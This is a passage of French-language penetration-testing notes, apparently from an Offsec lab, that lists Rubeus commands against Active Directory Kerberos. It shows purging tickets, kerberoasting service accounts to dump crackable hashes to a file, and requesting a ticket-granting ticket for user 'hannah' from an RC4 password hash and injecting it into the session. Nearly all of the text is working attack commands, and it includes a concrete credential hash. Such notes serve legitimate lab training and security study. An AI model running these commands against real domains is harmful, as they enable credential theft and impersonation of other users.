i avant d'exécuter Rubeus, on execute klist et qu'on voit plein de ticket, il va falloir les effacer :
```
.\Rubeus.exe purge
```

# Récupération des tickets kerberoast
```
.\rubeus kerberoast /outfile:hashes.krb
```

Pour créer un ticket au nom de hannah :
```
.\Rubeus.exe asktgt /domain:offsec.live /user:hannah  /rc4:a29f7623fd11550def0192de9246f46b /ptt
```